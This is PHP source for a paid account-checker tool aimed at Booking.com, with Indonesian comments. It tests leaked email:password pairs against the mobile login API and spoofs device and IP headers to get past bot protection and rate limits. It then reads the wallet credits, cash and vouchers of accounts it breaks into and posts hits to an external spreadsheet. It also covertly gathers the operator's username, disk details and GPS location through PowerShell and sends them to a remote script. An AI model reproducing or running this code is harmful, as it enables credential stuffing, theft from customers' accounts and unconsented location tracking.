<?php
class Booking
{
    public $Black,
        $Red,
        $Green,
        $Yellow,
        $Blue,
        $Purple,
        $Cyan,
        $White,
        $YellowBold,
        $RedBold,
        $GreenBold,
        $postbal,
        $external;

    public function header($mobiletoken = false, $accessToken = false)
    {
        return [
            'bal' => [
                'Host: mobile-apps.booking.com',
                'X-Apollo-Operation-Name: WalletBalance',
                "X-Auth-Token: " . $mobiletoken,
                'X-Access-Token: ' . $accessToken,
                'X-Booking-Iam-Access-Token: ' . $accessToken,
                'X-Library: okhttp+network-api',
                'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
                "User-Agent: " . $this->generateua(),
                'X-Booking-Api-Version: 1',
                'Content-Type: application/x-gzip; contains="application/json"',
                'X-Px-Authorization: 3',
                'X-Px-Original-Token: 3',
            ],
        ];
    }

    public function MailHeaderRandom()
    {
        $fixedData = [
            'Host: account.booking.com',
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: ' . $this->generateua(),
            // 'User-Agent: User-Agent: Booking.App/47.1.1 Android/9; Type: tablet; AppStore: google; Brand: Asus; Model: ASUS_I005DA;',
        ];

        $randomData = [
            // User-Agent dari berbagai browser dan search engine
            // 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            // 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0',
            // 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.1901.188',
            // 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            // 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36',
            // 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
            // 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            // 'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',

            // // Search Engine Bots
            // 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            // 'User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            // 'User-Agent: DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
            // 'User-Agent: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            // 'User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            // 'User-Agent: Mozilla/5.0 (compatible; Sogou web spider/4.0; +http://www.sogou.com/docs/help/webmasters.htm#07)',
            // 'User-Agent: Mozilla/5.0 (compatible; PetalBot; +https://webmaster.petalsearch.com/site/petalbot)',

            // // Lebih banyak User-Agent dari browser dan perangkat lainnya
            // 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
            // 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/72.0.3815.186',
            // 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.30.87',
            // 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/4.2.2406.44',
            // 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.110',
            // 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/82.0.4227.33',

            // Headers tambahan lainnya
            'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
            'X-Library: okhttp+network-api',
            'X-Px-Authorization: 3',
            'X-Px-Original-Token: 3',
            'Authorization: ',
            'X-Booking-Iam-Tsafs: ' . rand(9000, 10000),
            'X-Px-Bypass-Reason: Success checking sdk enabled - general success',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            'Accept-Encoding: gzip, deflate, br',
            'Accept-Language: en-US,en;q=0.9',
            'X-Request-ID: ' . uniqid(),
            'X-Forwarded-For: ' . mt_rand(1, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(1, 255),
            'X-Client-IP: ' . mt_rand(1, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(1, 255),
            'DNT: 1',
            'X-Real-IP: ' . mt_rand(1, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(0, 255) . '.' .
                mt_rand(1, 255),
            'TE: Trailers',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Dest: document',
            'Pragma: no-cache',
            'Upgrade-Insecure-Requests: 1',
        ];

        shuffle($randomData);

        $selectedRandomData = array_slice($randomData, 0, 4);

        $finalArray = array_merge($fixedData, $selectedRandomData);
        return $finalArray;
    }


    public function PassHeaderRandom()
    {
        /* [ Header $fixed data tidak boleh ditambahkan ke $randomData ] */
        $fixedData = [
            'Host: account.booking.com',
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: ' . $this->generateua(),
            // 'Cookie: bkng_wvpc=a:1&m:1; pcm_consent=analytical%3Dtrue%26countryCode%3DID%26consentId%3D' . $this->generateUUID() . '%26consentedAt%3D2024-09-20T02%3A35%3A56.083Z%26expiresAt%3D2025-03-19T02%3A35%3A56.083Z%26implicit%3Dtrue%26marketing%3Dtrue%26regionCode%3DJK%26regulation%3Dnone%26legacyRegulation%3Dnone; bkng_sso_auth=e30; bkng_sso_session=e30; bkng_sso_ses=e30;'
        ];
        /* [ $fiexdata jangan ditambah/dikurangin ] */

        /* [ Tambahkan header sebanyak mungkin ke $randomdata ] */

        $randomData = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
            'X-Library: okhttp+network-api',
            'Server: cloudflare',
            'Referer: https://account.booking.com/',
            'Origin: https://account.booking.com',
            'Accept-Encoding: gzip, deflate, br',
            'Location: cdn.cookielaw.org',
            'Accept: *',
            'X-Booking-Api-Version: 1',
            'X-Px-Authorization: 3',
            'X-Booking-Iam-Tsafs: ' . rand(1000, 9999),
            'X-Booking-Retry: 73',
            'X-Px-Bypass-Reason: Error checking sdk enabled - general failure',
            'Sec-Ch-Ua-Platform: "Android"',
            'X-Auth-Time: ' . time(),
            'X-Requested-With: booking.com',
            'Cookie: cnfunco=1; bkng_wvpc=a:1&m:1; bkng_sso_session=e30; bkng_sso_ses=e30',
            'X-Cache: Miss from cloudfront',
            'Date: ' . date('d F Y h:i:sa'),
            'Www-Authenticate: Basic realm="XML"',
            'Server: nginx',
            'Remote-Address: ' . rand(0, 100) . "." . rand(0, 100) . "." . rand(0, 100) . "." . rand(0, 100) . ":443",
        ];

        shuffle($randomData);

        $selectedRandomData = array_slice($randomData, 0, 4);

        $finalArray = array_merge($fixedData, $selectedRandomData);
        return $finalArray;
    }

    public function escapeSpecialChars($string)
    {
        // Ganti hanya karakter spesial yang perlu diubah menjadi Unicode escape
        return str_replace(
            ['<', '>', '=', '&', '"', "'"],
            ['\u003c', '\u003e', '\u003d', '\u0026', '\\"', '\u0027'],  // "\\" untuk tanda kutip
            $string
        );
    }

    public function postdata($email = false, $pass = false, $context = false, $deviceid = false)
    {
        return [
            'email' => [
                "action" => "STEP_ENTER__EMAIL__SUBMIT",
                "deviceContext" => [
                    "aid" => rand(300000, 999999),
                    "deviceId" => $deviceid,
                    'deviceType' => 'DEVICE_TYPE_ANDROID_NATIVE',
                    "lang" => "en-us",
                    "libVersion" => "1.3.3",
                    'oauthClientId' => 'eEUpvtgPz7Gv2NSOduzD'
                ],
                "identifier" => [
                    "type" => "IDENTIFIER_TYPE__EMAIL",
                    "value" => $email,
                ],
            ],
            'pass' => [
                'action' => 'STEP_SIGN_IN__PASSWORD__SUBMIT',
                'authenticator' => [
                    'type' => 'AUTHENTICATOR_TYPE__PASSWORD',
                    'value' => $pass,
                ],
                'context' => [
                    'value' => $context
                ],
                'deviceContext' => [
                    'aid' => rand(300000, 999999),
                    'deviceId' => $deviceid,
                    'deviceType' => 'DEVICE_TYPE_ANDROID_NATIVE',
                    'lang' => 'en-us',
                    'libVersion' => '1.3.192',
                    'oauthClientId' => 'eEUpvtgPz7Gv2NSOduzD'
                ]
            ]
        ];
    }

    public function generateua()
    {
        $lines = [
            'Booking.App/42.6 Android/9; Type: ' . $this->type()['type'] . '; AppStore: ' . $this->type()['appstore'] . '; Brand: ' . $this->type()['brand'] . '; Model: ' . $this->type()['phone'] . ';',
        ];
        // Sekarang $lines berisi 100 user agent yang berbeda
        $randomIndex = $lines[array_rand($lines)];
        return $randomIndex;
    }

    public function type()
    {
        $type = [
            'desktop',
            'mobile',
            'tablet',
        ];
        $randtype = $type[array_rand($type)];

        $appstore = [
            'google',
            'amazon',
        ];
        $randapp = $appstore[array_rand($appstore)];

        $brands = array(
            // "Apple",
            "Samsung",
            "Huawei",
            "Xiaomi",
            "Oppo",
            "Vivo",
            "Google",
            "Sony",
            "LG",
            "Motorola",
            "Nokia",
            "OnePlus",
            "ASUS",
            "Lenovo",
            "HTC",
            "BlackBerry",
            "Realme",
            "ZTE",
            "TCL",
            "Meizu"
        );
        $randbrand = $brands[array_rand($brands)];

        $phoneModels = array(
            // "iPhone 13",
            // "iPhone 13 Pro",
            // "iPhone 13 Pro Max",
            // "iPhone 13 Mini",
            // "iPhone 12", "iPhone 12 Pro", "iPhone 12 Pro Max", "iPhone SE", "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max",
            "Galaxy S21",
            "Galaxy S21+",
            "Galaxy S21 Ultra",
            "Galaxy Note 20",
            "Galaxy Note 20 Ultra",
            "Galaxy Z Fold 3",
            "Galaxy Z Flip 3",
            "Galaxy A52",
            "Galaxy A72",
            "Galaxy A32",
            "Galaxy A12",
            "P40",
            "P40 Pro",
            "Mate 40",
            "Mate 40 Pro",
            "Nova 8",
            "Nova 8 Pro",
            "Nova 7",
            "Nova 7 Pro",
            "Y9a",
            "Y7a",
            "Y5p",
            "Mi 11",
            "Mi 11 Pro",
            "Mi 11 Ultra",
            "Redmi Note 10",
            "Redmi Note 10 Pro",
            "Redmi 9",
            "Redmi 9C",
            "Redmi 9A",
            "POCO X3",
            "POCO X3 NFC",
            "Reno 5",
            "Reno 5 Pro",
            "Reno 5 Pro+",
            "A15",
            "A15s",
            "A53",
            "A53s",
            "F17",
            "F17 Pro",
            "F19",
            "F19 Pro",
            "V20",
            "V20 Pro",
            "V20 SE",
            "Y20",
            "Y20i",
            "Y20s",
            "Y30",
            "Y30i",
            "Y51",
            "Y51s",
            "Y31",
            "Pixel 5",
            "Pixel 4a",
            "Pixel 4a 5G",
            "Pixel 3a",
            "Pixel 3a XL",
            "Xperia 1 III",
            "Xperia 5 III",
            "Xperia 10 III",
            "Xperia 1 II",
            "Xperia 5 II",
            "Wing",
            "Velvet",
            "K92",
            "K31",
            "Stylo 6",
            "Moto G Power",
            "Moto G Stylus",
            "Moto G Fast",
            "Moto E",
            "Moto G Pro",
            "Nokia 8.3",
            "Nokia 5.4",
            "Nokia 3.4",
            "Nokia 2.4",
            "Nokia 1.4",
            "OnePlus 9",
            "OnePlus 9 Pro",
            "OnePlus 8T",
            "OnePlus 8",
            "OnePlus 8 Pro",
            "ROG Phone 5",
            "Zenfone 8",
            "Zenfone 7",
            "Zenfone 6",
            "Zenfone 5",
            "Legion Phone Duel 2",
            "Legion Phone Duel",
            "K12 Note",
            "K11",
            "K10 Note",
            "Desire 20+",
            "U20 5G",
            "Wildfire E2",
            "Desire 19s",
            "Desire 19+",
            "KEY2",
            "KEY2 LE",
            "Motion",
            "KEYone",
            "Priv",
            "Realme 8",
            "Realme 8 Pro",
            "Realme 7",
            "Realme 7 Pro",
            "Realme 6",
            "Realme 6 Pro",
            "Axon 20",
            "Axon 11",
            "Blade 20",
            "Blade A7s",
            "Blade A51",
            "10 5G",
            "10 Pro",
            "10L",
            "10 Plus",
            "10 SE",
            "17 Pro",
            "17",
            "16T",
            "16s Pro",
            "16s"
        );
        $randphone = $phoneModels[array_rand($phoneModels)];

        $a = [
            'type' => $randtype,
            'appstore' => $randapp,
            'brand' => $randbrand,
            'phone' => $randphone,
        ];
        return $a;
    }

    public function generateUUID()
    {
        return sprintf(
            '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0xffff)
        );
    }

    public function randomangka($length)
    {
        $rand = rand(0, $length);
        return $rand;
    }

    public function parseemail($data)
    {
        $data = str_ireplace(';', '|', $data);
        $data = str_ireplace(':', '|', $data);
        $parse = explode('|', $data);
        if (preg_match("/|/i", $data)) {
            if (!empty($parse[0]) && !empty($parse[1])) {
                $result = [
                    'email' => $parse[0],
                    'pass' => $parse[1],
                ];
            } else {
                (empty($parse[0])) ? $email = null : $email = $parse[0];
                (empty($parse[1])) ? $pass = null : $pass = $parse[1];
                $result = [
                    'email' => $email,
                    'pass' => $pass
                ];
            }
            return $result;
        } else {
            return false;
        }
    }

    public function validasiEmail($dataArray, $empas)
    {
        if (isset($dataArray->error[0])) {
            if (preg_match('/throttled/i', $dataArray->error[0]->errorDetails)) {
                // $message = "IP Kamu Limit";
                $message = "IP Kamu Limit: " . $dataArray->error[0]->errorDetails;
                file_put_contents('result/ip-limit.txt', $empas . PHP_EOL, FILE_APPEND);
            } else {
                $message = $dataArray->error[0]->errorDetails;
            }
        } else {
            if (isset($dataArray->nextStep)) {
                $data = $dataArray->nextStep;
                if ($data == 'STEP_ACCOUNT__LOCKED') {
                    $message = $this->Yellow . 'Akun Terkunci' . $this->White;
                } elseif ($data == 'STEP_EMAIL_MAGIC_LINK_SENT') {
                    $message = $this->Cyan . 'Masuk Menggunakan Link' . $this->White;
                } elseif ($data == 'STEP_REGISTER__PASSWORD') {
                    $message = $this->Red . 'Tidak Terdaftar' . $this->White;
                } elseif ($data == 'STEP_ACCOUNT__DISABLED') {
                    $message = $this->Blue . 'Disable' . $this->White;
                } elseif ($data == 'STEP_SIGN_IN__PASSWORD') {
                    $message = $this->Green . 'Email Terdaftar' . $this->White;
                } elseif ($data == 'STEP_SIGN_IN__MAGIC_LINK') {
                    $message = $this->Cyan . 'Masuk Menggunakan Link' . $this->White;
                } else {
                    $message = $this->YellowBold . '[!] Response ini tidak ditemukan dalam penyimpanan kami. . .' . $this->White;
                    file_put_contents('logs/logs-mail.txt', $data . PHP_EOL, FILE_APPEND);
                }
            } else {
                $message = $this->YellowBold . ' [!] Anomali Response Ditemukan' . $this->White;
                file_put_contents('result/anomali-response.txt', $empas . PHP_EOL, FILE_APPEND);
            }
        }

        return $message;
    }

    public function validasiAuth($dataArray, $empas)
    {
        if (isset($dataArray->error[0]->code)) {
            $data = $dataArray->error[0]->errorDetails;
            $dataCode = $dataArray->error[0]->code;
            if (preg_match('/throttled/i', $data)) {
                $message = $this->Yellow . ' IP Address Kamu Limit ' . $this->White;
            } elseif (preg_match('/Password is incorrect/i', $data)) {
                $message = $this->Red . ' Password Salah ' . $this->White;
            } elseif (preg_match('/ERROR_CODE__INVALID_DPOP_PROOF/i', $dataCode)) {
                $message = $this->Blue . ' Middleware DPOP Protect ' . $this->White;
            } else {
                $message = $this->Red . " " . $data . $this->YellowBold . " ";
            }
        } else {
            if (isset($dataArray->nextStep)) {
                $message = $this->Green . ' Login ' . $this->White;
            } else {
                $message = $this->Yellow . " Response Kosong " . $this->White;
                file_put_contents('result/response-kosong.txt', $empas . PHP_EOL, FILE_APPEND);
            }
        }
        return $message;
    }

    public function ambilNominal($input)
    {
        preg_match('/[+-]?\d+(\.\d+)?/', $input, $matches);
        if (!empty($matches)) {
            return $matches[0];
        } else {
            return null;
        }
    }

    public function parsein($data)
    {
        $rewardsAmount = $data->data->walletSummary->balance->rewards->upcoming->monetary->amount->prettified;
        $rewardsCount = $data->data->walletSummary->balance->rewards->upcoming->monetary->count;

        $vouchersAmount = $data->data->walletSummary->balance->vouchers->amount->prettified;
        $vouchersCount = $data->data->walletSummary->balance->vouchers->count;

        $cashAmount = $data->data->walletSummary->balance->credits->cash->prettified;
        $cashRaw = $data->data->walletSummary->balance->credits->cash->raw;

        $totalAmount = $data->data->walletSummary->balance->credits->total->prettified;
        $totalRaw = $data->data->walletSummary->balance->credits->total->raw;

        $BalanceAccount = "| Credit: $totalAmount | Pending: $rewardsAmount ($rewardsCount) | Cash: $cashAmount | Vouchers: $vouchersAmount";
        if ($this->ambilNominal($totalAmount) != 0 || $this->ambilNominal($rewardsAmount) != 0 || $this->ambilNominal($cashAmount) != 0 || $this->ambilNominal($vouchersAmount) != 0) {
            return [
                'status' => 'save',
                'credit' => $totalAmount,
                'pending' => $rewardsAmount,
                'countpending' => $rewardsCount,
                'cash' => $cashAmount,
                'voucher' => $vouchersAmount,
            ];
        } else {
            return [
                'status' => 'no',
                'credit' => $totalAmount,
                'pending' => $rewardsAmount,
                'countpending' => $rewardsCount,
                'cash' => $cashAmount,
                'voucher' => $vouchersAmount,
            ];
        }
    }

    public function spreadsheet($data = false)
    {
        if ($data) {
            $ch = curl_init();
            $options = [
                CURLOPT_URL => $this->external,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode([
                    'AKUN' => $data
                ]),
            ];
            curl_setopt_array($ch, $options);
            curl_exec($ch);
        }
    }

    public function isRemoteDesktop()
    {
        // Memeriksa apakah sedang berjalan di sesi Remote Desktop
        return isset($_SERVER['SESSIONNAME']) && preg_match('/^RDP/', $_SERVER['SESSIONNAME']);
    }

    function getSystemInfo()
    {
        $info = [];

        // Mendapatkan detail OS
        $info['os'] = php_uname('s') . ' ' . php_uname('r');
        $info['Machine'] = php_uname('m');

        // Mendapatkan pengguna saat ini
        $info['User'] = get_current_user();

        // Inisialisasi variabel untuk informasi disk dan GPS
        $info['disk'] = 'Informasi disk tidak tersedia';
        $info['deviceid'] = [
            'dat' => 'N/A',
            'dong' => 'N/A'
        ];

        // Deteksi sistem operasi
        if (strtoupper(PHP_OS) === 'WINNT') {
            // Mendapatkan informasi disk dan format
            $diskRawData = shell_exec('wmic logicaldisk get caption, size, freespace 2>&1');
            $diskLines = explode("\n", trim($diskRawData));

            $diskInfo = [];
            foreach ($diskLines as $line) {
                $line = trim($line);
                if ($line && strpos($line, 'Caption') === false) {
                    list($drive, $size, $freeSpace) = preg_split('/\s+/', $line, 3);
                    $sizeGB = number_format($size / (1024 ** 3), 2) . ' GB';
                    $freeSpaceGB = number_format($freeSpace / (1024 ** 3), 2) . ' GB';
                    $diskInfo[] = [
                        'Disk'  => $drive,
                        'Size' => $sizeGB,
                        'Free Space' => $freeSpaceGB
                    ];
                }
            }

            if ($this->isRemoteDesktop()) {
                $info['sistem'] = 'RDP';
                $dat = 'N/A';
                $dong = 'N/A';
            } else {
                // Mendapatkan GPS (jika tersedia)
                $command = 'powershell -Command "Add-Type -AssemblyName System.Device; $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; $geoWatcher.Start(); while (($geoWatcher.Status -ne \'Ready\') -and ($geoWatcher.Permission -ne \'Denied\')) { Start-Sleep -Milliseconds 100 }; $location = $geoWatcher.Position.Location; $location | Select Latitude,Longitude"';
                $gps = shell_exec($command);
                if ($gps) {

                    $pattern = '/(-?\d+\.\d+)\s+(-?\d+\.\d+)/';
                    preg_match($pattern, $gps, $matches);

                    if (count($matches) == 3) {
                        $latitude = $matches[1];
                        $longitude = $matches[2];
                        $dat = $latitude;
                        $dong = $longitude;
                        // // Tampilkan hasil latitude dan longitude
                        // echo "Latitude: " . $latitude . PHP_EOL;
                        // echo "Longitude: " . $longitude . PHP_EOL;
                    } else {
                        $dat = 'N/A';
                        $dong = 'N/A';
                    }
                } else {
                    $dat = 'N/A';
                    $dong = 'N/A';
                }

                if (!empty($gps)) {
                    $lines = explode("\n", $gps);
                    foreach ($lines as $line) {
                        if (strpos($line, 'GPSLatitude') !== false) {
                            $dat = floatval(trim(substr($line, strpos($line, '=') + 1)));
                        } elseif (strpos($line, 'GPSLongitude') !== false) {
                            $dong = floatval(trim(substr($line, strpos($line, '=') + 1)));
                        }
                    }
                }
            }


            foreach ($diskInfo as $diskini) {
                // Mengubah setiap informasi disk menjadi string
                $formattedDiskInfo[] = implode(', ', $diskini);
            }

            // Menggabungkan semua string yang diformat menjadi satu baris dengan pemisah
            $combinedString = implode(' | ', $formattedDiskInfo);

            // Memperbarui array info dengan informasi Windows
            $info['disk'] = $combinedString;
            $info['deviceid'] = [
                'dat' => $dat,
                'dong' => $dong
            ];
        } elseif (strtoupper(PHP_OS) === 'LINUX') {
            $info = false;
        }
        return $info;
    }

    public function logsprogram($data, $apikey, $status)
    {
        if (preg_match('/trial/i', $apikey)) {
            if (preg_match('/RDP/i', $data['sistem'])) {
                print_r($this->YellowBold . "[!] " . $this->Red . " Apikey Trial Hanya Tersedia Untuk Laptop/Komputer Sistem Operasi Window" . $this->White . PHP_EOL);
                print_r($this->YellowBold . "[!] " . $this->Red . " Silahkan Upgrade Agar Dapat Berjalan Disemua Platform Sistem Operasi" . $this->White . PHP_EOL);
                die();
            }
        }
        $ch = curl_init();
        $options = [
            CURLOPT_URL => 'https://script.google.com/macros/s/AKfycbxWTbJAd-PrSWT7F29j_CxmpfZNkQzq2EQ1brdg8HF9PUMqhWH7upuNa0XduU3KCdJE/exec?action=insert',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode([
                'DATE' => date('d F Y h:i:sa'),
                'APIKEY' => $apikey,
                'STATUS' => $status,
                'DEVICEID' => $data['deviceid']['dat'] . "," . $data['deviceid']['dong'],
                'OS' => $data['os'],
                'MACHINE' => $data['Machine'],
                'USER' => $data['User'],
                'DISK' => $data['disk'],
            ]),
        ];
        curl_setopt_array($ch, $options);
        curl_exec($ch);
    }

    public function pengumuman()
    {
        $ch = curl_init();
        $options = [
            CURLOPT_URL => 'https://script.google.com/macros/s/AKfycbyFWtam3sl17h5UlBfog992Ze3tbtWgmbuRdXwTABNCgzcKOo_G7KRUeK-Vp6cdnyBF/exec',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
        ];
        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        return json_decode($response);
    }

    public function parseDate($iso8601String)
    {
        // Extract the date part before the 'T'
        $date = strtok($iso8601String, 'T');
        return $date;
    }

    public function validasiapikey($apikeey = false)
    {
        $ch = curl_init();
        $options = [
            CURLOPT_URL => 'https://script.google.com/macros/s/AKfycbxEWV1qDb53ofB0LNwtOrLcGKeAV6ag9BQ0xUrgOkmGkNT5sVHH_PUrN0NZDJu_82r6/exec',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,

        ];
        curl_setopt_array($ch, $options);
        $response = json_decode(curl_exec($ch));
        $no = 0;
        $datakey = [];
        foreach ($response as $data) {
            # code...
            $no++;
            if (isset($data[$no]->Apikey)) {
                foreach ($data as $key) {
                    # code...
                    $storage = [
                        'Apikey' => $key->Apikey,
                        'Exp' => $key->Exp,
                        'Thread' => $key->Thread,
                    ];
                    array_push($datakey, $storage);
                }
            }
        }
        $hit = 1;
        $ret = [
            'status' => false,
            'apikey' => $apikeey,
            'message' => 'Invalid'
        ];
        foreach ($datakey as $dataasli) {
            # code...
            $hit++;
            if (strtolower($apikeey) == strtolower($dataasli['Apikey'])) {
                $expDateObj = new DateTime($this->parseDate($dataasli['Exp']));
                $currentDateObj = new DateTime(date('Y-m-d'));

                if ($currentDateObj > $expDateObj) {
                    $ret = [
                        'status' => true,
                        'apikey' => 'Valid',
                        'durasi' => $dataasli['Exp'],
                        'thread' => $dataasli['Thread'],
                        'message' => $this->Red . 'Masa Berlaku Sudah Habis',
                    ];
                } else {
                    $ret = [
                        'status' => true,
                        'apikey' => 'Valid',
                        'durasi' => $dataasli['Exp'],
                        'thread' => $dataasli['Thread'],
                        'message' => 'Semoga Berhasil'
                    ];
                }
                // goto ketemu;
            }
        }
        return $ret;
    }
}

$dataharga = [
    [
        'harga'    => 'Rp 3.000.000',
        'bulan'     => '1 Bulan',
        'thread'     => '50 Mesin Bot',
    ],
    [
        'harga'    => 'Rp 5.500.000',
        'bulan'     => '2 Bulan',
        'thread'     => '100 Mesin Bot',
    ],
    [
        'harga'    => 'Rp 8.000.000',
        'bulan'     => '3 Bulan',
        'thread'     => '150 Mesin Bot',
    ],
];
$datathread = [
    [
        'berlaku' => '1 Bulan',
        'harga' => 'Rp. 50.000',
        'thread' => '5 Mesin Bot'
    ],
];
$daftarfitur =
    [
        [
            'fitur' => 'Mode Pengecekkan / Checking Mode',
            'keterangan' => 'Mode Untuk Pengecekkan Email Saja Atau Keseluruhan'
        ],
        [
            'fitur' => 'Validasi Email',
            'keterangan' => 'Pengecekkan Email Terdaftar/Tidak'
        ],
        [
            'fitur' => 'Validasi Akun',
            'keterangan' => 'Memastikan Data Yang Dicek Berhasil Login Atau Tidak Secara Otomatis'
        ],
        [
            'fitur' => 'Menarik Informasi Saldo',
            'keterangan' => 'Mengambil Details Informasi Akun'
        ],
        [
            'fitur' => 'Proxy Connection',
            'keterangan' => 'Menggunakan Proxy Untuk Menghindari Limit Request'
        ],
        [
            'fitur' => 'Application Versi',
            'keterangan' => 'Dapat Mengkostum Versi Aplikasi Target'
        ],
        [
            'fitur' => 'Save Internal',
            'keterangan' => 'Melakukan Penyimpanan dan Filter otomatis pada local folder'
        ],
        [
            'fitur' => 'Save External',
            'keterangan' => 'Melakukan Penyimpanan dan Filter otomatis pada Google Spreadsheet'
        ],
        [
            'fitur' => 'Otomatis Hapus',
            'keterangan' => 'Menghapus Otomatis Data Yang Telah Dicek'
        ],
        [
            'fitur' => 'Thread',
            'keterangan' => 'Kecepatan Pengecekkan Berdasarkan Banyaknya Limit Thread'
        ],

    ];
